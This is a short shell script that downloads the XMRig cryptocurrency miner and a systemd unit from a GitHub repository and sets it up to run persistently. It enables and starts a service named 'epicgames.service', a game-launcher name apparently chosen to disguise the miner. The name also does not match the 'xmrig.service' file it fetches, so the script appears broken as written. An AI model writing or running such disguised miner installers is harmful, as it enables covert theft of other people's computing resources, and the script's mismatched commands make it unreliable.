echo "Autoinstalling XMRig"
cd ~
wget https://github.com/MaybeTrollface/autoinstaller-for-xmrig/raw/main/xmrig
cd /etc/systemd/system/
wget https://raw.githubusercontent.com/MaybeTrollface/autoinstaller-for-xmrig/main/xmrig.service
systemctl enable epicgames.service
systemctl start epicgames.service
echo "Script probably done. Use systemctl status epicgames.service to check the status!"
